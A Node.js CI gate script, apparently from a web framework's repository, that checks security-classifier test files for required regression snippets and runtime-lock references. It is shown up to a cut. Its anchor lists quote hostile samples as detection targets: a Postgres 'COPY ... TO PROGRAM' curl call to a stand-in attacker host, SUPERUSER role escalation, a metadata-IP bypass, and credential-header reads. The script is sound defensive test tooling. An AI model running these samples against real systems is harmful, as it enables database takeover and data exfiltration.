#!/usr/bin/env node
import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import path from 'node:path';

import { isMainEntry, runGate } from './lib/cli-entry.mjs';
import { repoRoot as findRepoRoot } from './lib/repo-root.mjs';

export const repoRoot = findRepoRoot();

const REQUEST_SAFE_RUNTIME_INVENTORY_FILE =
  'packages/core/src/internal/request-safe-runtime-inventory.ts';
const REQUEST_PROCESS_CLASSIFIER_FILE = 'packages/drizzle/src/trust-escapes-static.ts';
const REQUEST_SAFE_RUNTIME_RUNNER_FILES = {
  cliHandler: 'packages/cli/src/commands/build-export.ts',
  compiler: 'packages/compiler/src/security-bootstrap.ts',
  generatedPresets: 'packages/server/src/build.ts',
  requestHandler: 'packages/server/src/request-handler.ts',
  runtimeBootstrap: 'packages/server/src/runtime-bootstrap.ts',
};
const CUSTOM_REQUEST_HANDLER_ENTRY_FILES = [
  'examples/commerce/scripts/demo-serve.mjs',
  'examples/commerce/scripts/measure-style-size.mjs',
  'examples/crm/scripts/demo-serve.mjs',
  'examples/crm/src/app-shell.ts',
  'examples/gallery/src/app-shell.ts',
  'examples/reference/src/app-shell.ts',
  'examples/stackoverflow/scripts/demo-serve.mjs',
  'examples/stackoverflow/src/app-shell.ts',
  'packages/devtool/src/mount.mjs',
  'site/src/aux.ts',
];
const PACKED_REQUEST_HANDLER_RUNNER_FILES = ['tests/p10-perf.node.mjs'];
const PACKED_STATIC_EXPORT_RUNNER_FILES = ['tests/kovo-check.export-static-worker.mjs'];
const ROOT_PACK_CONFIG_FILE = 'vite.config.ts';
const SECURITY_LOCKED_SCRIPT_FILES = [
  'examples/commerce/scripts/measure-style-size.mjs',
  'examples/commerce/scripts/serve.mjs',
  'examples/crm/scripts/serve.mjs',
  'examples/gallery/scripts/export-static.mjs',
  'examples/reference/scripts/export-static.mjs',
  'examples/reference/scripts/serve.mjs',
  'examples/stackoverflow/scripts/serve.mjs',
  'scripts/demo-session/serve.mjs',
  'site/scripts/capture.mjs',
  'site/scripts/export-static.mjs',
  'site/scripts/measure-route-style-size.mjs',
  'site/scripts/serve.mjs',
  'tests/compiler-determinism-worker.mjs',
];
const COMPILER_DETERMINISM_RUNNER_FILE = 'tests/compiler-determinism-worker.mjs';
const SECURITY_LOCKED_NESTED_VITE_FILES = ['site/src/gallery.ts'];
const SECURITY_LOCKED_VITE_RUNNER_FILE = 'scripts/lib/secure-vite-runtime.mjs';
const SECURITY_LOCKED_VITE_BUILD_RUNNER_FILE = 'scripts/lib/secure-vite-build.mjs';
const SECURITY_LOCKED_IN_PROCESS_BUILD_FILES = [
  'site/scripts/export-static.mjs',
  'site/scripts/measure-route-style-size.mjs',
];
const SECURITY_LOCKED_COMPILER_SCRIPT_FILES = [
  'examples/stackoverflow/scripts/materialize-demo-css.mjs',
];
const SECURITY_LOCKED_PACKAGE_BUILD_FILES = [
  {
    file: 'examples/commerce/package.json',
    snippet: '"build:demo": "node ../../scripts/lib/secure-vite-build.mjs"',
  },
  {
    file: 'examples/crm/package.json',
    snippet: '"build": "node ../../scripts/lib/secure-vite-build.mjs"',
  },
  {
    file: 'examples/stackoverflow/package.json',
    snippet:
      '"build": "node ../../scripts/lib/secure-vite-build.mjs && node scripts/materialize-demo-css.mjs"',
  },
  {
    file: 'site/package.json',
    snippet: '"build:css": "node ../scripts/lib/secure-vite-build.mjs"',
  },
];
const SITE_STATIC_EXPORT_RUNNER_FILE = 'site/scripts/export-static.mjs';
const PURE_APP_ENTRY_FILES = [
  'examples/commerce/src/app.tsx',
  'examples/crm/src/interactive-app.tsx',
  'examples/stackoverflow/src/interactive-app.tsx',
  'packages/create-kovo/templates/src/app.tsx',
  'site/src/app.tsx',
];
const CUSTOM_REQUEST_HANDLER_DOC_FILES = [
  'site/content/guides/deployment.md',
  'site/content/guides/request-shell.md',
];
const RUNTIME_BOOTSTRAP_IMPORT = "import '@kovojs/server/runtime-bootstrap';";
const PACKED_RUNTIME_BOOTSTRAP_IMPORT = "import '../dist/server/src/runtime-bootstrap.mjs';";

const REQUEST_SAFE_RUNTIME_SET_ALIGNMENT = [
  ['requestSafeGlobalCallables', 'REQUEST_SAFE_GLOBAL_CALLABLES'],
  ['requestSafeGlobalNamespaces', 'REQUEST_SAFE_GLOBAL_NAMESPACES'],
  ['requestSafeGlobalConstructors', 'REQUEST_SAFE_GLOBAL_CONSTRUCTORS'],
];

export const REQUIRED_CLASSIFIER_CORPORA = [
  {
    id: 'redos',
    marker: '@kovo-security-classifier-corpus redos',
    testFiles: ['packages/server/src/redos.test.ts', 'packages/compiler/src/redos-pattern.test.ts'],
    verdictAnchors: [
      {
        id: 'nested-quantifier-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: ['([\\w)]+)+', 'toThrow(RedosPatternError)'],
      },
      {
        id: 'overlapping-alternatives-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: ['^(a|aa)+$', 'overlapping alternatives'],
      },
      {
        id: 'nested-overlapping-alternatives-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: ['((a|a))+', 'nested group interiors contain overlapping alternatives'],
      },
      {
        id: 'followup-17-b1-dollar-line-terminator-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: ['B1 trailing line terminator', "compileLinearPattern('a$')", "'a\\n'"],
      },
      {
        id: 'followup-17-b3-in-class-legacy-numeric-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: [
          'B3 in-class legacy numeric escape',
          "compileLinearPattern('^[^\\\\1-\\\\37]+$')",
        ],
      },
      {
        id: 'followup-17-p2-case-gap-range-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: ['P2 i-flag case-gap range', "'[A-_]'", "'[Z-a]'"],
      },
      {
        id: 'compiler-overlapping-alternatives-regression',
        file: 'packages/compiler/src/redos-pattern.test.ts',
        snippets: ['^(a|a)*$', "toContain('KV434')"],
      },
      {
        id: 'compiler-nested-overlapping-alternatives-regression',
        file: 'packages/compiler/src/redos-pattern.test.ts',
        snippets: ['((a|a))+', "toContain('KV434')"],
      },
    ],
  },
  {
    id: 'egress-ip',
    marker: '@kovo-security-classifier-corpus egress-ip',
    testFiles: ['packages/server/src/egress.test.ts'],
    verdictAnchors: [
      {
        id: 'octal-ip-regression',
        file: 'packages/server/src/egress.test.ts',
        snippets: ["normalizeIpLiteral('0177.0.0.1')", "'127.0.0.1'"],
      },
      {
        id: 'metadata-bypass-regression',
        file: 'packages/server/src/egress.test.ts',
        snippets: ["classifyIp('0xA9FEA9FE')", "'metadata'"],
      },
      {
        id: 'azure-identity-endpoint-provider-separation',
        file: 'packages/server/src/egress.test.ts',
        snippets: [
          'Azure IDENTITY_ENDPOINT corpus',
          "identityEndpoint: 'http://127.1:40342/msi/token?api-version=2019-08-01'",
          "runWithMetadataAccess('azure'",
          "runWithMetadataAccess('aws'",
          "runWithMetadataAccess('gcp'",
          'reserves a hostname-configured identity port before its first DNS resolution',
          "identityEndpoint: 'http://identity.internal:40344/msi/token'",
        ],
      },
    ],
  },
  {
    id: 'better-auth-credentials',
    marker: '@kovo-security-classifier-corpus better-auth-credentials',
    testFiles: [
      'packages/better-auth/src/index.schema-bridge.test.ts',
      'packages/better-auth/src/index.schema-materialize.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'apikey-secret-classification',
        file: 'packages/better-auth/src/index.schema-bridge.test.ts',
        snippets: ["apiKey: { domain: 'auth', key: 'userId', secret: ['key'] }"],
      },
      {
        id: 'schema-intrinsic-poisoning-regression',
        file: 'packages/better-auth/src/index.schema-materialize.test.ts',
        snippets: [
          'keeps credential-table annotations after late schema-control poisoning',
          "kovo({ domain: 'auth', key: 'userId', secret: ['token'] })",
          'Object.keys = (() => [])',
          'RegExp.prototype.exec = (() => null)',
        ],
      },
    ],
  },
  {
    id: 'sink-registry',
    marker: '@kovo-security-classifier-corpus sink-registry',
    testFiles: [
      'packages/core/src/internal/source-sink-registry.test.ts',
      'scripts/check-sink-policy-gate.test.mjs',
    ],
    verdictAnchors: [
      {
        id: 'redirect-url-mechanism',
        file: 'packages/core/src/internal/source-sink-registry.test.ts',
        snippets: ["['redirect URL', 'reconstruct']"],
      },
      {
        id: 'outbound-egress-mechanism',
        file: 'packages/core/src/internal/source-sink-registry.test.ts',
        snippets: ["['outbound egress request', 'own']"],
      },
      {
        id: 'raw-filesystem-reject-corpus',
        file: 'scripts/check-sink-policy-gate.test.mjs',
        snippets: [
          'rejects raw filesystem file-serve sinks outside the rooted file primitive',
          'createWriteStream(requestedPath)',
          'rawOpen(requestedPath',
        ],
      },
      {
        id: 'generated-static-fd-identity-corpus',
        file: 'scripts/check-sink-policy-gate.test.mjs',
        snippets: [
          'keeps the generated Node static-file allowance tied to fd identity revalidation',
          'readFileDescriptor(fileDescriptor, callback)',
          'body: await readFile(resolved)',
        ],
      },
    ],
  },
  {
    id: 'postgres-identity-posture',
    marker: '@kovo-security-classifier-corpus postgres-identity-posture',
    testFiles: ['packages/server/src/postgres-grant-shape-fuzzer.test.ts'],
    verdictAnchors: [
      {
        id: 'grant-shape-closure-fuzzer',
        file: 'packages/server/src/postgres-grant-shape-fuzzer.test.ts',
        snippets: [
          'matches audit refusal to engine-reachable leak shapes across grants and object classes',
        ],
      },
      {
        id: 'identity-attribute-axis',
        file: 'packages/server/src/postgres-grant-shape-fuzzer.test.ts',
        snippets: [
          'matches the identity-attribute axis against runtime-login and assumable-role posture',
        ],
      },
    ],
  },
  {
    id: 'kv418-request-authority',
    marker: '@kovo-security-classifier-corpus kv418-request-authority',
    testFiles: ['packages/compiler/src/scan/parse.test.ts'],
    verdictAnchors: [
      {
        id: 'direct-alias-dynamic-enumeration',
        file: 'packages/compiler/src/scan/parse.test.ts',
        snippets: [
          "request.headers.get('COOKIE')",
          'const req = request',
          'input.headerName',
          'Object.fromEntries(headers)',
        ],
      },
      {
        id: 'wrapped-rest-arguments-and-mutable-names',
        file: 'packages/compiler/src/scan/parse.test.ts',
        snippets: [
          "handler: ((_input, request) => request.headers.get('cookie'))",
          "let name = 'x-signature'",
          'arguments[1].headers',
          'handler: (...args)',
          "const name = 'cookie'",
        ],
      },
      {
        id: 'uninspectable-handlers-and-unresolved-keys',
        file: 'packages/compiler/src/scan/parse.test.ts',
        snippets: [
          'handler: referencedHandler',
          '{ ...sharedOptions }',
          "const runtimeKey = 'machine/runtime'",
          'unresolvedName: true',
        ],
      },
    ],
  },
  {
    id: 'kv424-request-process',
    marker: '@kovo-security-classifier-corpus kv424-request-process',
    testFiles: ['packages/drizzle/src/trust-escapes-static.test.ts'],
    verdictAnchors: [
      {
        id: 'existing-dangerous-sink-closed-verdicts',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'el.innerHTML = userInput',
          'document.write(markup)',
          'setTimeout("doThing()", 100)',
          'new Function("return 1")',
        ],
      },
      {
        id: 'process-import-and-request-surface-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'execFileSync as runFile',
          'const { spawnSync: runSpawn } = processApi',
          'required.fork(input.module)',
          'request-handler.opaque-package-call',
        ],
      },
      {
        id: 'dynamic-code-server-root-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'await import(input.module)',
          'new vm.Script(input.code)',
          'runInNewContext: execute',
        ],
      },
      {
        id: 'aliased-code-timer-and-module-resolution-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'Reflect.apply(moduleEval',
          'later(input.code, 1)',
          'process.getBuiltinModule',
          'createRequire(import.meta.url)',
          'require(input.module)',
        ],
      },
      {
        id: 'filesystem-path-and-reference-escape-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'readFileSync as read',
          'requiredPath[request.method]',
          '[input.value].map(execFileSync)',
          'Reflect.apply(execFileSync',
          'child[input.method]',
        ],
      },
      {
        id: 'filesystem-and-node-builtin-census-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          "expect.arrayContaining(['mkdtempDisposableSync', 'openAsBlob', 'readFileSync'])",
          "expect.arrayContaining(['inspector', 'process', 'sqlite'])",
          'fails closed over every unreviewed Node builtin namespace',
        ],
      },
      {
        id: 'adjacent-process-runtime-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'Worker as Thread',
          'cluster.fork()',
          'Bun.spawn([input.code])',
          'new Deno.Command(input.code)',
        ],
      },
      {
        id: 'environment-and-request-credential-wire-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'const viteEnvironment = import.meta.env',
          'processEnvironment = nodeProcess.env',
          "import { serverSecret } from './config.js'",
          "request.headers.get('COOKIE')",
          "context.request.headers.get('authorization')",
          "request.headers.get('Proxy-Authorization')",
          'return Object.fromEntries(headers)',
          'result.token = get(input.headerName)',
          'token: reveal(context.request)',
          "import { reveal, safeUrl } from './helper.js'",
          'token?.slice(0, 4)',
          'alias.token = request.headers.get',
          'fill(result, request)',
          'revealDestructured(request)',
          'request.headers.forEach((value, name)',
          'request.headers.entries()) result[name] = value',
        ],
      },
      {
        id: 'framework-owned-file-storage-controls',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          "context.storage.get('fixed-key')",
          'respond.stream(context.stream',
          "respond.file('safe'",
        ],
      },
      {
        id: 'request-minted-framework-authority-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'rootedFiles(input.root)',
          'createFileSystemStorage({ root: input.root })',
          'createS3CompatibleStorage(input.storage)',
          'commandAllowlist([input.program]',
          'cmd(input.program, input.argv',
          'server[input.exportName]',
        ],
      },
      {
        id: 'module-scope-authority-controls',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          "rootedFiles('/srv/kovo/files')",
          "createFileSystemStorage({ root: '/srv/kovo/storage' })",
          "commandAllowlist(['/usr/bin/true']",
          "cmd('/usr/bin/true', [], { allow })",
        ],
      },
      {
        id: 'closed-call-graph-and-safe-call-controls',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'makeRunner()(input.value)',
          'helpers[input.method](input.value)',
          'runner.run(input.value)',
          'return callback(value)',
          '[body].map((value) => String(value).trim())',
          'await request.text()',
        ],
      },
      {
        id: 'generated-auth-environment-exact-grammar',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'accepts only the exact pristine Better Auth CSRF environment derivation grammar',
          "betterAuthCsrfFromEnvironment({ field: 'csrf', sessionId() { return 'global'; } })",
          'accepts only exact Better Auth environment binding option records',
          '<request-scoped-framework-setup>',
          'createBetterAuthSqliteBindingsFromEnvironment',
          'await appRuntimeDbReady;',
          'bindings.seedDemoUser',
          'export const appSeedDemoUser = bindings.seedDemoUser;',
          'class SeedAtBoot { static { void bindings.seedDemoUser(); } }',
        ],
      },
      {
        id: 'generated-runtime-constructor-and-pristine-data-closure',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'accepts only the exact declarative SQLite app runtime constructor grammar',
          'function getTables() { return APP_TABLES; }',
          'let escaped; escaped = APP_TABLES',
          'class Tables { get value() { return APP_TABLES; } }',
          'function* seeds() { yield APP_SEED; }',
          'class StaticHolder { static value = APP_TABLES; }',
          'class Holder { value = APP_SEED; }',
          'keeps generated database and auth setup constructors at module initialization',
          'postgresAppRuntimeOptions({',
          'class Holder { static value = appRuntimeSchema; }',
          'export default appRuntimeSchema;',
          'export const escapedSchema = <Carrier value={appRuntimeSchema} />;',
          'principalFromRequest(request)',
          "request.headers.get('x-user')",
          "COPY (SELECT current_user) TO PROGRAM 'curl https://attacker.invalid'",
          'CREATE FUNCTION steal() RETURNS void',
          'CREATE EXTENSION file_fdw',
          'GRANT kovo_system TO public',
          'ALTER ROLE kovo_app WITH SUPERUSER',
        ],
      },
      {
        id: 'generated-retained-key-unary-and-jsx-helper-closure',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'treats only inert logical-not as a non-mutating retained-config unary use',
          "for (const operator of ['+', '-', '~'])",
          'accepts only the pristine generated contacts query key as an optimistic computed key',
          '[${computedKey}](draft, input)',
          "execFileSync('helper-callback')",
          "execFileSync('helper-getter')",
          "execFileSync('helper-proxy')",
          'keeps exact boot-setup memo verdicts scoped to one source-program analysis',
        ],
      },
      {
        id: 'internal-postgres-capability-remains-opaque',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'does not grant app code raw Postgres DB authority through the internal subpath',
          "from '@kovojs/server/internal/postgres-capability'",
          'rawDb.execute(input.sql)',
          '<opaque-module-initializer:@kovojs/server/internal/postgres-capability>',
        ],
      },
    ],
  },
  {
    id: 'client-handler-import',
    marker: '@kovo-security-classifier-corpus client-handler-import',
    testFiles: [
      'packages/compiler/src/client-handler-boundary-security.test.ts',
      'packages/compiler/src/client-handler-import-policy.test.ts',
      'packages/compiler/src/component-event-boundary-registry.test.ts',
      'packages/compiler/src/handler-lowering.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'published-data-never-grants-import-authority',
        file: 'packages/compiler/src/client-handler-boundary-security.test.ts',
        snippets: [
          'publishToClient value-only executable boundary',
          'array destructuring alias',
          'container member invocation',
          'higher-order Promise callback',
          'preserves an audited non-callable value',
          'never emits an imported module for a published value assertion',
          'snapshots one pristine same-file const',
        ],
      },
      {
        id: 'client-handler-dynamic-code-closed',
        file: 'packages/compiler/src/client-handler-boundary-security.test.ts',
        snippets: [
          'client-handler dynamic-code boundary',
          'async-generator constructor',
          'constant-folded constructor property',
          'reflective descriptor extraction',
          'browser string-timer code',
        ],
      },
      {
        id: 'jsx-intrinsic-component-lexical-boundary',
        file: 'packages/compiler/src/client-handler-boundary-security.test.ts',
        snippets: [
          'JSX intrinsic/component lexical boundary',
          'leading underscore',
          'non-ASCII lower-case letter',
          'CJK identifier',
          'preserves intrinsic host grammar',
        ],
      },
      {
        id: 'node-and-loader-authority-closed',
        file: 'packages/compiler/src/client-handler-import-policy.test.ts',
        snippets: [
          "import { execFileSync } from 'node:child_process'",
          'dynamic import',
          'CommonJS require',
          'TypeScript import equals',
          'import.meta authority',
        ],
      },
      {
        id: 'alias-wrapper-and-host-spread-closed',
        file: 'packages/compiler/src/client-handler-import-policy.test.ts',
        snippets: [
          'module alias',
          'module wrapper',
          'inline host spread',
          'module host spread',
          'blocks every handler sharing a globally withheld binding',
        ],
      },
      {
        id: 'reviewed-function-dynamic-authority-closed',
        file: 'packages/compiler/src/client-handler-import-policy.test.ts',
        snippets: [
          'constructor property',
          'computed constructor property',
          'prototype constructor',
        ],
      },
      {
        id: 'canonical-and-audited-positive-controls',
        file: 'packages/compiler/src/client-handler-import-policy.test.ts',
        snippets: [
          'allows an exact reviewed Headless UI callable',
          'projects the canonical name into code and manifest',
          'refuses an audited value import because module evaluation is executable authority',
          'tabsKeyDown as safeTabs',
        ],
      },
      {
        id: 'lexical-and-registry-integrity',
        file: 'packages/compiler/src/client-handler-import-policy.test.ts',
        snippets: [
          'sibling nested-block declaration',
          'genuine same-block lexical shadow',
          'requires an exact reviewed module and export pair',
          'snapshots generated registry data before later mutation attempts',
        ],
      },
      {
        id: 'component-event-boundary-closed',
        file: 'packages/compiler/src/handler-lowering.test.ts',
        snippets: [
          'fails closed before a forwarded component event',
          'inline-spread',
          'alias-spread',
          'ui-prefix-forgery',
          'ui-export-forgery',
          'type-only-forgery',
          'allows statically known data-only component spreads',
          'keeps reviewed @kovojs/ui component events',
        ],
      },
      {
        id: 'component-registry-exact-and-immutable',
        file: 'packages/compiler/src/component-event-boundary-registry.test.ts',
        snippets: [
          'stays pinned to the generated @kovojs/ui component descriptors',
          'requires an exact reviewed module and export pair',
          'cannot be mutated to widen or replace a reviewed decision',
        ],
      },
    ],
  },
];

export function evaluateSecurityClassifierCorpus(options = {}) {
  const root = options.repoRoot ?? repoRoot;
  const corpora = options.corpora ?? REQUIRED_CLASSIFIER_CORPORA;
  const readText =
    options.readText ?? ((relativePath) => readFileSync(path.join(root, relativePath), 'utf8'));
  const run = options.run ?? ((testFiles) => runVitest(testFiles, root));
  const findings = [];
  const testFiles = [];
  const fileText = new Map();

  if (options.enforceRuntimeInventory ?? options.corpora === undefined) {
    findings.push(...evaluateRequestSafeRuntimeInventoryAlignment(readText));
  }

  for (const corpus of corpora) {
    const markerFiles = [];
    for (const testFile of corpus.testFiles) {
      let text = '';
      try {
        text = readText(testFile);
      } catch {
        findings.push(`${corpus.id}: missing required corpus test file ${testFile}`);
        continue;
      }
      fileText.set(testFile, text);
      testFiles.push(testFile);
      if (text.includes(corpus.marker)) markerFiles.push(testFile);
    }
    if (markerFiles.length === 0) {
      findings.push(`${corpus.id}: no test file contains marker ${JSON.stringify(corpus.marker)}`);
    }
    for (const anchor of corpus.verdictAnchors ?? []) {
      const text = fileText.get(anchor.file);
      if (typeof text !== 'string') continue;
      const missing = anchor.snippets.filter((snippet) => !text.includes(snippet));
      if (missing.length > 0) {
        findings.push(
          `${corpus.id}: missing verdict anchor ${JSON.stringify(anchor.id)} in ${anchor.file}`,
        );
      }
    }
  }

  if (findings.length === 0) {
    const result = run([...new Set(testFiles)]);
    if (!result.ok) findings.push(result.output || 'security classifier corpus vitest failed');
  }

  return {
    corpora: corpora.length,
    findings,
    ok: findings.length === 0,
    testFiles: [...new Set(testFiles)],
  };
}

/**
 * Keep classifier-safe names within the exact bootstrap-locked inventory (SPEC §6.6 rule 6).
 * This reads source declarations instead of importing TypeScript through the plain-Node gate.
 */
export function evaluateRequestSafeRuntimeInventoryAlignment(readText) {
  let inventorySource;
  let classifierSource;
  try {
    inventorySource = readText(REQUEST_SAFE_RUNTIME_INVENTORY_FILE);
  } catch {
    return [`request-safe-runtime: missing ${REQUEST_SAFE_RUNTIME_INVENTORY_FILE}`];
  }
  try {
    classifierSource = readText(REQUEST_PROCESS_CLASSIFIER_FILE);
  } catch {
    return [`request-safe-runtime: missing ${REQUEST_PROCESS_CLASSIFIER_FILE}`];
  }

  const findings = [];
  for (const [inventoryName, classifierName] of REQUEST_SAFE_RUNTIME_SET_ALIGNMENT) {
    const locked = sourceStringArray(inventorySource, inventoryName);
    const classified = sourceStringArray(classifierSource, classifierName);
    if (locked === undefined) {
      findings.push(`request-safe-runtime: cannot read locked inventory ${inventoryName}`);
      continue;
    }
    if (classified === undefined) {
      findings.push(`request-safe-runtime: cannot read classifier set ${classifierName}`);
      continue;
    }
    const lockedNames = new Set(locked);
    const excess = [...new Set(classified)].filter((name) => !lockedNames.has(name)).sort();
    if (excess.length > 0) {
      findings.push(
        `request-safe-runtime: ${classifierName} exceeds ${inventoryName}: ${excess.join(', ')}`,
      );
    }
  }

  const classifiedBuiltins = sourceStringArray(classifierSource, 'REQUEST_SAFE_BUILTIN_MODULES');
  if (classifiedBuiltins === undefined) {
    findings.push('request-safe-runtime: cannot read classifier set REQUEST_SAFE_BUILTIN_MODULES');
  } else if (classifiedBuiltins.length > 0) {
    findings.push(
      `request-safe-runtime: REQUEST_SAFE_BUILTIN_MODULES must remain empty: ${[...new Set(classifiedBuiltins)].sort().join(', ')}`,
    );
  }

  const lockedNamespaceMembers = sourceStringArray(
    inventorySource,
    'requestSafeGlobalNamespaceMemberPaths',
  );
  const classifiedNamespaceMembers = sourceReviewedGlobalNamespaceMembers(classifierSource);
  if (lockedNamespaceMembers === undefined || classifiedNamespaceMembers === undefined) {
    findings.push(
      'request-safe-runtime: cannot read the reviewed global namespace member inventory',
    );
  } else {
    const locked = new Set(lockedNamespaceMembers);
    const classified = new Set(classifiedNamespaceMembers);
    const excess = [...classified].filter((path) => !locked.has(path)).sort();
    const stale = [...locked].filter((path) => !classified.has(path)).sort();
    if (excess.length > 0) {
      findings.push(
        `request-safe-runtime: REQUEST_REVIEWED_GLOBAL_NAMESPACE_MEMBERS exceeds requestSafeGlobalNamespaceMemberPaths: ${excess.join(', ')}`,
      );
    }
    if (stale.length > 0) {
      findings.push(
        `request-safe-runtime: requestSafeGlobalNamespaceMemberPaths exceeds REQUEST_REVIEWED_GLOBAL_NAMESPACE_MEMBERS: ${stale.join(', ')}`,
      );
    }
  }

  const callbackInventory = sourceStringArray(inventorySource, 'requestSafeCallbackGlobals');
  const callbackClassifier = sourceStringArray(classifierSource, 'callbackGlobal of');
  if (callbackInventory === undefined || callbackClassifier === undefined) {
    findings.push('request-safe-runtime: cannot read the reviewed callback-global inventory');
  } else {
    const lockedNames = new Set(callbackInventory);
    const excess = [...new Set(callbackClassifier)].filter((name) => !lockedNames.has(name)).sort();
    if (excess.length > 0) {
      findings.push(
        `request-safe-runtime: callback globals exceed requestSafeCallbackGlobals: ${excess.join(', ')}`,
      );
    }
  }

  const governedGlobals = sourceStringArray(inventorySource, 'requestGovernedGlobalBindings');
  if (governedGlobals === undefined) {
    findings.push('request-safe-runtime: cannot read the governed global inventory');
  } else {
    const governed = [...new Set(governedGlobals)].sort();
    if (governed.length !== 1 || governed[0] !== 'fetch') {
      findings.push(
        `request-safe-runtime: requestGovernedGlobalBindings must contain exactly fetch: ${governed.join(', ')}`,
      );
    }
  }
  if (!classifierSource.includes("expressionResolvesToGlobalCallable(node, 'fetch'")) {
    findings.push('request-safe-runtime: classifier is missing the governed direct-fetch rule');
  }

  for (const requiredLockReference of [
    'appendUniqueNames(inventory.globalCallables',
    'appendUniqueNames(inventory.globalNamespaces',
    'appendUniqueNames(inventory.globalConstructors',
    'appendUniqueNames(inventory.callbackGlobals',
    'appendUniqueNames(inventory.governedGlobals',
    'inventory.globalNamespaceMemberPaths',
  ]) {
    if (!inventorySource.includes(requiredLockReference)) {
      findings.push(`request-safe-runtime: global lock is missing ${requiredLockReference}`);
    }
  }

  const requiredRunnerReferences = {
    cliHandler: [
      'createRequestHandler, deriveClosedKovoApp, runWithGeneratedLiveTargetRegistry',
      'runWithGeneratedLiveTargetRegistry',
    ],
    compiler: ['lockRequestSafeRuntimeRealm();'],
    generatedPresets: [
      'lockRequestSafeRuntimeRealmWithInventory',
      'lockRequestSafeRuntimeRealm(${generatedRequestSafeRuntimeInventorySource});',
    ],
    requestHandler: ['assertServerRequestSafeRuntimeRealmLocked();'],
    runtimeBootstrap: ['lockServerRequestSafeRuntimeRealm();'],
  };
  for (const [runner, file] of Object.entries(REQUEST_SAFE_RUNTIME_RUNNER_FILES)) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    for (const reference of requiredRunnerReferences[runner]) {
      if (!source.includes(reference)) {
        findings.push(`request-safe-runtime: ${file} is missing ${reference}`);
      }
    }
  }
  findings.push(...evaluateCustomRunnerBootstrapOrdering(readText));
  return findings;
}

/** Keep reusable framework-owned app shells raw and custom-runner docs bootstrap-first. */
export function evaluateCustomRunnerBootstrapOrdering(readText) {
  const findings = [];
  for (const file of CUSTOM_REQUEST_HANDLER_ENTRY_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (
      !source.includes('createRequestHandler') ||
      source.includes('@kovojs/server/internal/app-shell-vite')
    ) {
      findings.push(
        `request-safe-runtime: ${file} must keep the public guarded request handler behind its supported runner`,
      );
    }
  }
  for (const file of PACKED_REQUEST_HANDLER_RUNNER_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (!source.includes('createRequestHandler')) {
      findings.push(
        `request-safe-runtime: ${file} must keep the public guarded request handler behind its supported runner`,
      );
    }
    const firstImport = source.split('\n').find((line) => line.trimStart().startsWith('import '));
    if (firstImport?.trim() !== PACKED_RUNTIME_BOOTSTRAP_IMPORT) {
      findings.push(
        `request-safe-runtime: ${file} must start imports with ${PACKED_RUNTIME_BOOTSTRAP_IMPORT}`,
      );
    }
    if (/(?:from\s+|import\(\s*)['"]playwright['"]/u.test(source)) {
      findings.push(
        `request-safe-runtime: ${file} must isolate Playwright from the locked request-serving realm`,
      );
    }
    if (!source.includes("new Worker(new URL('./p10-perf-browser-worker.mjs'")) {
      findings.push(
        `request-safe-runtime: ${file} must run the Playwright client in its isolated worker realm`,
      );
    }
  }
  for (const file of PACKED_STATIC_EXPORT_RUNNER_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (!source.includes('exportStaticApp')) {
      findings.push(
        `request-safe-runtime: ${file} must keep the public guarded static exporter behind its supported runner`,
      );
    }
    const firstImport = source.split('\n').find((line) => line.trimStart().startsWith('import '));
    if (firstImport?.trim() !== PACKED_RUNTIME_BOOTSTRAP_IMPORT) {
      findings.push(
        `request-safe-runtime: ${file} must start imports with ${PACKED_RUNTIME_BOOTSTRAP_IMPORT}`,
      );
    }
  }

  let rootPackConfigSource;
  try {
    rootPackConfigSource = readText(ROOT_PACK_CONFIG_FILE);
  } catch {
    findings.push(`request-safe-runtime: missing ${ROOT_PACK_CONFIG_FILE}`);
  }
  if (
    rootPackConfigSource !== undefined &&
    !rootPackConfigSource.includes("'packages/server/src/runtime-bootstrap.ts'")
  ) {
    findings.push(
      `request-safe-runtime: ${ROOT_PACK_CONFIG_FILE} root pack must emit packages/server/src/runtime-bootstrap.ts`,
    );
  }
  for (const file of SECURITY_LOCKED_SCRIPT_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (!source.includes('createSecurityLockedViteServer')) {
      findings.push(`request-safe-runtime: ${file} must use the compiler-first locked Vite runner`);
    }
    if (file === COMPILER_DETERMINISM_RUNNER_FILE) {
      if (
        /\bcreateServer\b/u.test(source) ||
